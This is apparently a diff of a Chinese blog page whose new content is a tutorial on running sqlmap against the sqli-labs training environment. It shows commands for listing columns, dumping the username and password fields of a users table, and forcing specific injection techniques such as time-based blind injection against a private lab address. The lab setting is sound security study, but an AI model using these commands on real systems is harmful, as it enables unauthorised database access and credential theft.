+<h2><span id="获取列名">获取列名</span></h2><h3><span id="方法一">方法一</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>r 文件路径 <span class="operator">-</span>D数据库名 <span class="operator">-</span>T表名 <span class="comment">--batch --columns</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="operator">-</span>T后跟表名，可得到表的全部列名，当T不写时默认是该数据库所有表的全部列名</span><br></pre></td></tr></table></figure>
+<p>示例如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>r &quot;D:\sqlmap\3.txt&quot; <span class="operator">-</span>D&quot;security&quot; <span class="operator">-</span>T&quot;users&quot; <span class="comment">--batch --columns</span></span><br></pre></td></tr></table></figure>
+<p>执行结果如下<br><img src="https://img-blog.csdnimg.cn/fdb542a29cc3463c81616fd2baad08d6.png" alt="在这里插入图片描述"></p>
+<h3><span id="方法二">方法二</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>r 文件路径<span class="operator">-</span>p注入参数 <span class="comment">--dbms mysql --columns</span></span><br></pre></td></tr></table></figure>
+<p>示例如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>r &quot;D:\sqlmap\3.txt&quot; <span class="operator">-</span>p&quot;passwd&quot; <span class="comment">--dbms mysql --columns</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>获取当前数据库下的列名</span><br></pre></td></tr></table></figure>
+<p>执行结果如下<br><img src="https://img-blog.csdnimg.cn/5c99ca0f40ce4db8827f38b7fc6c3b56.png" alt="在这里插入图片描述"></p>
+<h2><span id="获取字段信息">获取字段信息</span></h2><h3><span id="方法一">方法一</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>r 文件路径 <span class="operator">-</span>D数据库名 <span class="operator">-</span>T表名 <span class="operator">-</span>C列名 <span class="comment">--dump --batch</span></span><br></pre></td></tr></table></figure>
+<p>示例如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>r &quot;D:\sqlmap\3.txt&quot; <span class="operator">-</span>D&quot;security&quot; <span class="operator">-</span>T&quot;users&quot; <span class="operator">-</span>C&quot;username,password&quot; <span class="comment">--dump --batch</span></span><br></pre></td></tr></table></figure>
+<p>执行结果如下<br><img src="https://img-blog.csdnimg.cn/5bf40068cde34b06900fda2bd1bfadad.png" alt="在这里插入图片描述"></p>
+<h3><span id="方法二">方法二</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>r 文件路径 <span class="operator">-</span>p注入参数 <span class="comment">--dbms mysql --dump</span></span><br></pre></td></tr></table></figure>
+<p>示例如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py <span class="operator">-</span>r &quot;D:\sqlmap\3.txt&quot; <span class="operator">-</span>p&quot;passwd&quot; <span class="comment">--dbms mysql --dump</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>获取当前数据库下全部的字段信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/746d293bb3554251bb0465ef7ff647a3.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/15bec0c2b4884530b8b11980facd9e40.png" alt="在这里插入图片描述"></p>
+<h1><span id="指定注入方式">指定注入方式</span></h1><p>sqlmap默认利用可用的全部方式，当我们想利用某一种方式来进行注入时，该怎么办呢<br>指令</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--technique B 布尔盲注</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--technique E 报错注入</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--technique U union查询注入</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--technique S 堆叠注入</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--technique T 时间盲注</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--technique Q 内联查询注入</span></span><br></pre></td></tr></table></figure>
+<p>部分示例如下</p>
+<h2><span id="联合查询注入">联合查询注入</span></h2><p><img src="https://img-blog.csdnimg.cn/ad079852a5fc4381a0810dfe0287943a.png" alt="在这里插入图片描述"></p>
+<h2><span id="时间盲注">时间盲注</span></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u&quot;http://192.168.134.132/Less-28a/?id=1&quot; <span class="comment">--technique T --time-sec 1 --dbs   </span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="comment">--technique T指定使用时间盲注，--time-sec 1 设置时间盲注时间为1，--dbs  查询数据库</span></span><br></pre></td></tr></table></figure>
+<p>执行结果如下<br><img src="https://img-blog.csdnimg.cn/38b50a35293d482797c3094813d1921d.png" alt="在这里插入图片描述"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u&quot;http://192.168.134.132/Less-28a/?id=1&quot;  <span class="comment">--technique T --time-sec 1 --tables </span></span><br></pre></td></tr></table></figure>
+<p>执行结果如下<br><img src="https://img-blog.csdnimg.cn/c5ceded8064b4c1ba695be42f5234b7e.png" alt="在这里插入图片描述"></p>
 
       
     </div>
@@ -597,7 +672,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://quan9i.github.io/post%E6%B3%A8%E5%85%A52/" title="sql-lab 21-23">https://quan9i.github.io/post%E6%B3%A8%E5%85%A52/</a>
+    <a href="https://quan9i.github.io/sqlmap/" title="sqlmap使用(sqli-labs为例)">https://quan9i.github.io/sqlmap/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -641,8 +716,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/python%E6%8F%92%E4%BB%B6/" rel="next" title="python request模块安装及所遇问题小记">
-                <i class="fa fa-chevron-left"></i> python request模块安装及所遇问题小记
+              <a href="/dockerstudy/" rel="next" title="docker初学小结">
+                <i class="fa fa-chevron-left"></i> docker初学小结
               </a>
             
           </div>
@@ -650,10 +725,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/sql-lab/" rel="prev" title="sql-lab 18-20">
-                sql-lab 18-20 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -829,7 +900,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">sql-lab 21</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">sql-lab 22</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.1.</span> <span class="nav-text">查看所有数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.2.</span> <span class="nav-text">查询表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.3.</span> <span class="nav-text">查询列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.4.</span> <span class="nav-text">查询字段</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">sql-lab 23</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">3.1.</span> <span class="nav-text">查询所有数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">3.2.</span> <span class="nav-text">查询表名</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">sql-map部分指令</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.1.</span> <span class="nav-text">- -is-dba</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.2.</span> <span class="nav-text">- -current</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.3.</span> <span class="nav-text">-D，-T，-C</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.4.</span> <span class="nav-text">- -dump</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.5.</span> <span class="nav-text">-v</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.6.</span> <span class="nav-text">–batch</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">get类型</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">3.1.</span> <span class="nav-text">检测可注入类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">3.2.</span> <span class="nav-text">获取数据库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">3.3.</span> <span class="nav-text">获取表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">3.4.</span> <span class="nav-text">获取列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">3.5.</span> <span class="nav-text">获取字段信息</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">4.</span> <span class="nav-text">post类型</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">4.1.</span> <span class="nav-text">准备工作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">4.2.</span> <span class="nav-text">检测可注入类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">4.3.</span> <span class="nav-text">破解数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.3.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.3.2.</span> <span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">4.4.</span> <span class="nav-text">破解数据表</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.4.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.4.2.</span> <span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">4.5.</span> <span class="nav-text">获取列名</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.5.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.5.2.</span> <span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">4.6.</span> <span class="nav-text">获取字段信息</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.6.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">4.6.2.</span> <span class="nav-text">方法二</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">5.</span> <span class="nav-text">指定注入方式</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">5.1.</span> <span class="nav-text">联合查询注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">5.2.</span> <span class="nav-text">时间盲注</span></a></li></ol></li></ol></div>
             
 
           </div>
